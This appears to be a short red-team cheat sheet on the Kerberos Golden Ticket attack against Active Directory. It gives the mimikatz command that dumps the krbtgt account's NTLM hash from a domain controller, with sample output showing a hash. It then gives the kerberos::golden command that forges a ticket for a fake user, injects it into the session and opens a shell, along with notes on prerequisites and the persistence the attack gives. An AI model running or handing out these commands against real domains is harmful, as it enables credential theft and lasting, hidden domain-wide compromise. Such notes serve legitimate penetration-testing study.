---
title: Golden Ticket
date: M02-18-2023
author: i4
---
- Create a TGT with the credentials of the `krbtgt` user
- Allows persistence and arbitrary PAC entries
- `krbtgt` credentials get changed if the functional level is upgraded (from 2003 to 2008)
- Requires compromised DA or compromised Domain Controller

## Dumping krbtgt ntlm
```mimikatz
mimikatz # lsadump::lsa /patch

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : fc274a94b36874d2582918a103853fab
```

## Creating a golden ticket
- Does not require administrative permissions
- Can be done on a non-domain joined system
- Use `whoami /user` for the SID enumeration
```mimikatz
mimikatz # kerberos::golden /user:fake /domain:[domain] /sid:S-1-5-21-xxx-xxx-xxx /krbtgt:fc274a94b36874d2582918a103853fab /ptt
mimikatz # misc::cmd
```